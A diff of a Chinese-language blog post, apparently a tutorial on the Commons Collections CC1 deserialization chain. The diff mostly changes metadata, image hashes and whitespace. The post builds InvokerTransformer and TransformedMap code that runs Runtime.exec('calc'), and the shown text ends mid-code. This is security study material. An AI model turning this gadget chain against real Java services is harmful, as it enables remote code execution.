@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" CC1链-利用TransformedMap方法 JAVA安全初探(三):CC1链全分析-先知社区\nJAVA反序列化——CC1链 - Infernity&rsquo;s Blog\n这里本来是想用cursor，但是这个cursor不会自动将commons-collections.jar自动转换为java代码，所以想看源码要自己解压，十分不方便，其次就是这个用Maven的标准模式运行不了（需要在json配置依赖，比较麻烦），但是IJ可以直接运行，奇怪的是cursor可以用极简模式，IJ不行，IJ的格式要求比较严格，还有就是IJ要单独打开项目才可以运行，所以我综合这两个一起使用\n">
 <title>cc1_1</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="cc1_1">
 <meta property='og:description' content=" CC1链-利用TransformedMap方法 JAVA安全初探(三):CC1链全分析-先知社区\nJAVA反序列化——CC1链 - Infernity&rsquo;s Blog\n这里本来是想用cursor，但是这个cursor不会自动将commons-collections.jar自动转换为java代码，所以想看源码要自己解压，十分不方便，其次就是这个用Maven的标准模式运行不了（需要在json配置依赖，比较麻烦），但是IJ可以直接运行，奇怪的是cursor可以用极简模式，IJ不行，IJ的格式要求比较严格，还有就是IJ要单独打开项目才可以运行，所以我综合这两个一起使用\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/cc1_1/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-09-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-11T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="cc1_1">
 <meta name="twitter:description" content=" CC1链-利用TransformedMap方法 JAVA安全初探(三):CC1链全分析-先知社区\nJAVA反序列化——CC1链 - Infernity&rsquo;s Blog\n这里本来是想用cursor，但是这个cursor不会自动将commons-collections.jar自动转换为java代码，所以想看源码要自己解压，十分不方便，其次就是这个用Maven的标准模式运行不了（需要在json配置依赖，比较麻烦），但是IJ可以直接运行，奇怪的是cursor可以用极简模式，IJ不行，IJ的格式要求比较严格，还有就是IJ要单独打开项目才可以运行，所以我综合这两个一起使用\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -392,14 +392,14 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Transformer</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个类会接受一个对象进行操作，看看这个类的实现（引用）</p>
 <p><img src="/p/cc1_1/image-20250716211654125.png"
 	width="978"
 	height="175"
-	srcset="/p/cc1_1/image-20250716211654125_hu_84cb5c7bcf9835f7.png 480w, /p/cc1_1/image-20250716211654125_hu_518c37ab0766475a.png 1024w"
+	srcset="/p/cc1_1/image-20250716211654125_hu_a3bb560f12af5c7c.png 480w, /p/cc1_1/image-20250716211654125_hu_e6c201c54dc1a734.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250716211654125"
@@ -458,14 +458,14 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//含参构造器，我们在外部调用类时需要用到</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//参数为方法名，所调用方法的参数类型，所调用方法的参数值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//参数为方法名，所调用方法的参数类型，所调用方法的参数值</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">iMethodName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">methodName</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">iParamTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">iArgs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//重写的transform方法</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//接收一个对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//重写的transform方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//接收一个对象</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
@@ -483,7 +483,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">iMethodName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; on &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; threw an exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">ex</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>看了这个transform方法的定义，这里的参数都是可控的，那么我们就可以利用这里来调用任意类的任意方法:</p>
@@ -516,27 +516,27 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//我们来回顾一下如何利用反射调用Runtime中的exec方法</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 获取当前 Java 虚拟机的 Runtime 实例</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 获取当前 Java 虚拟机的 Runtime 实例</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 获取 r 这个对象的类对象（即 java.lang.Runtime 的 Class 实例）</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 获取 r 这个对象的类对象（即 java.lang.Runtime 的 Class 实例）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 通过反射获取 Runtime 类中名为 &#34;exec&#34;，参数类型为 String 的方法</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 通过反射获取 Runtime 类中名为 &#34;exec&#34;，参数类型为 String 的方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 用反射调用 r（Runtime 实例）上的 exec 方法，参数是 &#34;calc&#34;，等价于 r.exec(&#34;calc&#34;); 作用是在 Windows 下弹出计算器</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">m</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//那么我们尝试用transform方法来调用</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w"> </span><span class="c1">//方法名为exec，参数类型为String，参数值为calc</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">r</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 用反射调用 r（Runtime 实例）上的 exec 方法，参数是 &#34;calc&#34;，等价于 r.exec(&#34;calc&#34;); 作用是在 Windows 下弹出计算器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">m</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//那么我们尝试用transform方法来调用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w"> </span><span class="c1">//方法名为exec，参数类型为String，参数值为calc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">r</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//总结:比较上面两种方式，下面的transform相当于模拟了上诉的反射过程。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//总结:比较上面两种方式，下面的transform相当于模拟了上诉的反射过程。</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这就利用了 InvokerTransformer 通过反射调用 Runtime 的 exec 方法，实现弹出计算器（calc）。</p>
@@ -559,15 +559,15 @@
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">cc1_2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">cc1_2</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">mian</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w"> </span><span class="c1">//方法名为exec，参数类型为String，参数值为calc</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">r</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250716214656825.png" alt="image-20250716214656825" style="zoom:50%;" />
@@ -588,7 +588,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//我们找到该类的构造器</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="nf">TransformedMap</span><span class="p">(</span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="nf">TransformedMap</span><span class="p">(</span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">;</span><span class="w">
@@ -606,10 +606,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//找到该类的checkSetValue方法</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">checkSetValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//接受一个对象类型的参数</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">checkSetValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//接受一个对象类型的参数</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">value</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个构造函数是protected，所以得让它<strong>自己调用自己（本类调用）</strong>,所以我们就需要找到内部实例化的工具，这里往上查找，可以找到一个public的静态方法decorate</p>
@@ -637,12 +637,12 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//invokerTransformer.transform(r);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//invokerTransformer.transform(r);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w"> </span><span class="c1">//这个直接实例化一个HashMap</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedmap</span><span class="o">=</span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w"> 
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们调用这个方法，然后实例化这个类，然后接下来想办法调用checkSetValue方法</p>
@@ -650,7 +650,7 @@
 </h3><p><img src="/p/cc1_1/image-20250717105254186.png"
 	width="1764"
 	height="931"
-	srcset="/p/cc1_1/image-20250717105254186_hu_85213ede903ed1ca.png 480w, /p/cc1_1/image-20250717105254186_hu_a48dcd44786203eb.png 1024w"
+	srcset="/p/cc1_1/image-20250717105254186_hu_53bdd59bcec19db1.png 480w, /p/cc1_1/image-20250717105254186_hu_5afc013ab7f440a2.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250717105254186"
@@ -665,7 +665,7 @@
 <p><img src="/p/cc1_1/image-20250720110841897.png"
 	width="1151"
 	height="235"
-	srcset="/p/cc1_1/image-20250720110841897_hu_f5418cf0f3ff404.png 480w, /p/cc1_1/image-20250720110841897_hu_9829fd2df3f85f48.png 1024w"
+	srcset="/p/cc1_1/image-20250720110841897_hu_83055ca1db57f922.png 480w, /p/cc1_1/image-20250720110841897_hu_2a6a273c7c175d02.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250720110841897"
@@ -704,14 +704,14 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parent</span><span class="p">.</span><span class="na">checkSetValue</span><span class="p">(</span><span class="n">value</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="n">value</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</strong></p>
 <p><img src="/p/cc1_1/image-20250717113204380.png"
 	width="1065"
 	height="461"
-	srcset="/p/cc1_1/image-20250717113204380_hu_c82113ce86a68fa5.png 480w, /p/cc1_1/image-20250717113204380_hu_b3fc585b22f4a26a.png 1024w"
+	srcset="/p/cc1_1/image-20250717113204380_hu_50d452be2a5427ec.png 480w, /p/cc1_1/image-20250717113204380_hu_3f9dc5fd568cf91f.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250717113204380"
@@ -760,13 +760,13 @@
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
